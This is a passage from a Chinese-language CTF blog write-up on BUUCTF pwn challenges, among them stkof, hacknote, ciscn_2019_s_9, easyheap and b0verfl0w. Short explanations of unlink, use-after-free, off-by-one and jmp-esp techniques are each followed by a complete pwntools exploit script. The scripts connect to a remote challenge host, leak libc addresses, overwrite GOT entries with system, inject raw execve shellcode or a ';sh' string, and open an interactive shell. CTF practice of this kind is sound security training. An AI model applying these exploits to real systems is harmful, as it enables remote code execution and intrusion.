0x30，这里fd，bk构造最为精巧）</p><p>0x80（至少为0x80，能分配到unsortbin）</p><p>0x30（任意大小，防止与topchunk合并）</p><p>2.堆溢出伪造一个chunk，让系统以为它是空闲的chunk，然后free触发unlink，最后就是在bss段里存chunk指针的一个指针指向这个bss段，这题里改chunk2指针的地址指向，golobal[0]=free_got ,golobal[1]=puts_got，修改chunk1，就是改golobal[0]指向的free_got里的内容为puts_plt，调用free就会调用puts，free（2）即puts（puts_got）就泄露了libc地址</p><p>3.得出system地址后，重复上述步骤，改free_got为system地址，并填入/bin/sh，开shell</p><p><strong>chunk状态检查</strong>：</p><p><strong>检查1</strong>：检查与被释放chunk相邻高地址的chunk的prevsize的值是否等于被释放chunk的size大小</p><p><strong>检查2</strong>：检查与被释放chunk相邻高地址的chunk的size的P标志位是否为0</p><p><strong>检查3</strong>：检查前后被释放chunk的fd和bk</p><p>以上三点就是检查chunk是否空闲的三大标准</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./stkof&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25134</span>)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                     :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    r.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(size))<br>    r.recvuntil(<span class="hljs-string">&quot;OK\n&quot;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    r.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,strings</span>):<br>    r.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br>    r.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(strings)))<br>    r.send(strings)<br>    r.recvuntil(<span class="hljs-string">&quot;OK\n&quot;</span>)<br><br><span class="hljs-comment">#------------------------------------------------------</span><br>target = <span class="hljs-number">0x602140</span><br>fd = target-<span class="hljs-number">0x8</span><br>bk = target<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>free_got = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><br>add(<span class="hljs-number">0x20</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x30</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#3 </span><br>add(<span class="hljs-number">0x30</span>) <span class="hljs-comment">#4</span><br>pd1=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x30</span>)+p64(fd)+p64(bk)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0x30</span>)+p64(<span class="hljs-number">0x90</span>)<br>edit(<span class="hljs-number">2</span>,pd1)<br>free(<span class="hljs-number">3</span>)<br>pd2=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(free_got)+p64(puts_got)<br>edit(<span class="hljs-number">2</span>,pd2)<br>edit(<span class="hljs-number">1</span>,p64(puts_plt))<br>free(<span class="hljs-number">2</span>)<br><span class="hljs-comment">#debug()</span><br>putgot=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(putgot)<br><span class="hljs-comment">#--------------------------------------------------------</span><br>obj=LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,putgot)<br>base=putgot-obj.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br><span class="hljs-comment">#print hex(base)</span><br>system=base+obj.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><span class="hljs-comment">#binsh=base+obj.dump(&quot;str_bin_sh&quot;)</span><br>edit(<span class="hljs-number">1</span>,p64(system))<br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>free(<span class="hljs-number">4</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="pwnable-hacknote">pwnable_hacknote</h3><p>参考师傅：[<a href="https://www.cnblogs.com/xlrp/p/14273598.html">BUUCTF]PWN——pwnable_hacknote - Angel-Yan - 博客园 (cnblogs.com)</a></p><p>这题堆的结构很特别</p><p>利用方法：先释放两个chunk，再申请0x8大小，会申请那两个结构0x10的note块，能改后一个note块的内容，改为got表，由于本题的uaf，指针未置0，还能继续调用原本的chunk，就泄露了地址，类似步骤改note块里put函数为system，后一个填/bin/sh，“但是这样失败了但是使用连续执行多条命令的’ ; ‘，第一条执行错误会被忽略，然后执行下一条，因此可以成功将content位置覆盖成 ‘;sh\0’或||sh，同样的然后show（chunk1）就能执行system（‘sh’）得到shell了”</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./hacknote&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/root/glibc-all-in-onebsubc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27024</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#---------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>        ru(<span class="hljs-string">&#x27;Your choice :&#x27;</span>)<br>        sl(<span class="hljs-string">&#x27;1&#x27;</span>)<br>        ru(<span class="hljs-string">&#x27;Note size :&#x27;</span>)<br>        sl(<span class="hljs-built_in">str</span>(size))<br>        ru(<span class="hljs-string">&#x27;Content :&#x27;</span>)<br>        sl(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>        ru(<span class="hljs-string">&#x27;Your choice :&#x27;</span>)<br>        sl(<span class="hljs-string">&#x27;2&#x27;</span>)<br>        ru(<span class="hljs-string">&#x27;Index :&#x27;</span>)<br>        sl(<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>        ru(<span class="hljs-string">&#x27;Your choice :&#x27;</span>)<br>        sl(<span class="hljs-string">&#x27;3&#x27;</span>)<br>        ru(<span class="hljs-string">&#x27;Index :&#x27;</span>)<br>        sl(<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#----------------------------------------------</span><br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<span class="hljs-comment">#1</span><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">8</span>,p32(<span class="hljs-number">0x804862b</span>)+p32(puts_got))<span class="hljs-comment">#2</span><br>show(<span class="hljs-number">1</span>)<br>puts_addr = u32(rc(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(puts_addr)<br>base=puts_addr-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">8</span>,p32(system)+<span class="hljs-string">&#x27;;sh\0&#x27;</span>)<br><span class="hljs-comment">#debug()</span><br>show(<span class="hljs-number">1</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-s-9">ciscn_2019_s_9</h3><p>这题没开nx，直接栈溢出写shellcode</p><p>但溢出只有50-0x20-4=10</p><p>所以栈中先填shellcode，返回地址填入本题中有的jmp_esp，然后再esp-40到call esp命令处，执行shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-comment">#r=process(&#x27;./ciscn_s_9&#x27;)</span><br>r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26224</span>)<br>context.arch=<span class="hljs-string">&#x27;i386&#x27;</span><br>sc=<span class="hljs-string">&#x27;\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80&#x27;</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">len</span>(sc)<br>jmp_esp=<span class="hljs-number">0x08048554</span><br>call=asm(<span class="hljs-string">&#x27;sub esp,40;call esp&#x27;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">len</span>(call)<br>r.sendline(sc.ljust(<span class="hljs-number">0x24</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)+p32(jmp_esp)+call)<br><br>r.interactive()<br><br><br></code></pre></td></tr></table></figure><h3 id="picoctf-2018-shellcode">picoctf_2018_shellcode</h3><p>这里让我们输入的地方直接是ret的地址，且没开nx，直接用shellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29624</span>)<br>context.arch=<span class="hljs-string">&#x27;i386&#x27;</span><br>sc=asm(shellcraft.sh())<br>r.sendline(sc)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="npuctf-2020-easyheap">npuctf_2020_easyheap</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./npuctf_2020_easyheap&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25288</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    ru(<span class="hljs-string">&#x27;Your choice :&#x27;</span>)<br>    sl(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    ru(<span class="hljs-string">&#x27;Size of Heap(0x10 or 0x20 only) : &#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(size))<br>    ru(<span class="hljs-string">&#x27;Content:&#x27;</span>)<br>    sl(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    ru(<span class="hljs-string">&#x27;Your choice :&#x27;</span>)<br>    sl(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    ru(<span class="hljs-string">&#x27;Index :&#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(index))<br>    ru(<span class="hljs-string">&#x27;Content:&#x27;</span>)<br>    sl(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    ru(<span class="hljs-string">&#x27;Your choice :&#x27;</span>)<br>    sl(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    ru(<span class="hljs-string">&#x27;Index :&#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    ru(<span class="hljs-string">&#x27;Your choice :&#x27;</span>)<br>    sl(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    ru(<span class="hljs-string">&#x27;Index :&#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#-----------------------------------------------</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>)<span class="hljs-comment">#1</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p8(<span class="hljs-number">0x41</span>))<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x38</span>,<span class="hljs-string">&#x27;p&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+p64(<span class="hljs-number">0x8</span>)+p64(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]))<br>show(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#-----------------------------------------------</span><br>addr=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br><span class="hljs-comment">#obj=LibcSearcher(&#x27;free&#x27;,addr)</span><br>base=addr-libc.sym[<span class="hljs-string">&#x27;free&#x27;</span>]<br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br><span class="hljs-comment">#----------------------------------------------</span><br>edit(<span class="hljs-number">1</span>,p64(system))<br>free(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="cmcc-pwnme2">cmcc_pwnme2</h3><p>这题原本add_home,add_flag为的是在bss段的string里写入/home/flag然后利用exec_string读取flag</p><p>但在buu里路径flag就可以读取</p><p>不能用add_flag去填string会填入/flag(不同于flag,我猜)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27836</span>)<br>puts_plt=<span class="hljs-number">0x8048440</span><br>exec_string=<span class="hljs-number">0x80485cb</span><br>string=<span class="hljs-number">0x804a060</span><br>r.sendline(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x6c</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">4</span>+p32(puts_plt)+p32(exec_string)+p32(string))<br>r.sendline(<span class="hljs-string">&#x27;flag&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="x-ctf-b0verfl0w">x_ctf_b0verfl0w</h3><p>又是遇到这种题目，还是用jmp_esp跳到栈上执行shellcode的方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25252</span>)<br><span class="hljs-comment">#r=process(&#x27;./b0verfl0w&#x27;)</span><br>context.arch=<span class="hljs-string">&#x27;i386&#x27;</span><br>pd=<span class="hljs-string">&#x27;\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80&#x27;</span><br>pd=pd.ljust(<span class="hljs-number">0x24</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>jmp_esp=<span class="hljs-number">0x08048504</span><br>pd+=p32(jmp_esp)+asm(<span class="hljs-string">&#x27;sub esp,0x28;call esp&#x27;</span>)<br>r.sendline(pd)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="picoctf-2018-leak-me">picoctf_2018_leak_me</h3><p>可以学到了，参考这位师傅<a 